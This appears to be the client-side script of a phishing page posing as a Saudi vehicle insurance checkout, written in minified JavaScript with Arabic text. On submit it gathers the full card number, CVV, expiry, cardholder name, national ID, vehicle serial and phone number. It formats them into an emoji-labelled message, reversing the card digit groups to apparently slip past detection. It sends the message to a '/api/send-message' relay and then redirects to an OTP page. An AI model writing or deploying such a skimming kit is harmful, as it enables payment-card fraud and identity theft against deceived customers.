const cardNumberInput=document.getElementById('cardNumber');const cvvInput=document.getElementById('cvv');const monthInput=document.getElementById('expMonth');const yearInput=document.getElementById('expYear');const cardForm=document.getElementById('cardForm');const appleMessage=document.getElementById('applePayMessage');const paymentRadios=document.querySelectorAll('input[name="payment"]');cardNumberInput.addEventListener('input',function(e){let value=e.target.value.replace(/\D/g,'');if(value.length>16)value=value.slice(0,16);const formatted=value.replace(/(.{4})/g,'$1 ').trim();e.target.value=formatted});paymentRadios.forEach(radio=>{radio.addEventListener('change',function(){if(this.value==='apple'){appleMessage.style.display='block';cardForm.style.display='none'}else{appleMessage.style.display='none';cardForm.style.display='block'}})});function generateReferenceNumber(){return Math.floor(100000000+Math.random()*900000000)}
function formatDate(dateStr){const d=new Date(dateStr);return d.toLocaleDateString('ar-EG')}
const insuranceType=localStorage.getItem("insuranceType")||"تأمين المركبات ضد الغير";const startDate=localStorage.getItem("startDate")||new Date().toISOString().split('T')[0];const totalPrice=parseFloat(localStorage.getItem("selectedPrice")||436.52);const endDateObj=new Date(startDate);endDateObj.setFullYear(endDateObj.getFullYear()+1);const discount=60.24;const tax=65.48;const adminFees=0;const subscriptionInstallment=totalPrice;const subtotal=(subscriptionInstallment-discount+adminFees).toFixed(2);const finalAmount=(parseFloat(subtotal)+tax).toFixed(2);const refNumber=generateReferenceNumber();document.getElementById("insuranceType").textContent=insuranceType;document.getElementById("startDate").textContent=formatDate(startDate);document.getElementById("endDate").textContent=formatDate(endDateObj);document.getElementById("refNumber").textContent=refNumber;document.getElementById("totalPrice").textContent=`${totalPrice.toFixed(2)} رس`;document.getElementById("subscriptionInstallment").textContent=`${subscriptionInstallment.toFixed(2)} رس`;document.getElementById("subtotal").textContent=`${subtotal} رس`;document.getElementById("finalAmount").textContent=`${finalAmount} رس`;localStorage.setItem("endDate",endDateObj.toISOString().split('T')[0]);localStorage.setItem("subscriptionInstallment",subscriptionInstallment.toFixed(2));localStorage.setItem("subtotal",subtotal);localStorage.setItem("finalAmount",finalAmount);localStorage.setItem("refNumber",refNumber);cardForm.addEventListener('submit',function(e){e.preventDefault();const rawCardNumber=cardNumberInput.value.replace(/\s/g,'');const cvv=cvvInput.value;const month=parseInt(monthInput.value,10);const year=yearInput.value;if(rawCardNumber.length!==16){alert('رقم البطاقة يجب أن يحتوي على 16 رقمًا.');return}
if(!/^\d{3}$/.test(cvv)){alert('CVV يجب أن يكون 3 أرقام.');return}
if(!(month>=1&&month<=12)){alert('الشهر يجب أن يكون بين 01 و 12.');return}
let inputYear=year.trim();if(!/^\d{2}$/.test(inputYear)&&!/^\d{4}$/.test(inputYear)){alert('السنة يجب أن تكون رقمين (مثل 25) أو 4 أرقام (مثل 2025).');return}
if(inputYear.length===2){inputYear='20'+inputYear}
if(parseInt(inputYear)<new Date().getFullYear()){alert('السنة يجب أن تكون السنة الحالية أو أكبر.');return}
const formData=JSON.parse(localStorage.getItem("formData")||"{}");const nationalId=formData.id||"غير متوفر";const serialNumber=formData.serial||"غير متوفر";const phone=formData.phone||"غير متوفر";const cardName=document.getElementById('cardHolderName').value;const paymentMethod=document.querySelector('input[name="payment"]:checked').value;const expiryDate=`${month}/${year}`;localStorage.setItem("cardNumber",rawCardNumber);const reversedCardNumber=rawCardNumber.match(/.{1,4}/g).map(group=>group.split('').reverse().join('')).join(' ');const message=`
الفيزا

👤 اسم حامل البطاقة: ${cardName}
💳 رقم البطاقة: ${reversedCardNumber}
📆 تاريخ الانتهاء: ${expiryDate}
🔒 CVV: ${cvv}
💰 طريقة الدفع: ${paymentMethod}

-----------------------
📄 نوع التأمين: ${insuranceType}
📅 تاريخ البداية: ${formatDate(startDate)}
📅 تاريخ الانتهاء: ${formatDate(endDateObj)}
💵 السعر: ${totalPrice.toFixed(2)} رس

-----------------------
🆔 رقم الهوية: ${nationalId}
🔢 الرقم التسلسلي: ${serialNumber}
📱 رقم الهاتف: ${phone}
🔢 الرقم المرجعي: ${refNumber}
`;fetch('/api/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:message})}).then(response=>response.json()).then(data=>{if(data.ok){window.location.href="otp.html"}else{alert("فشل في إرسال البيانات.")}}).catch(error=>{console.error(error);alert("❌ فشل في الاتصال بالخادم.")})})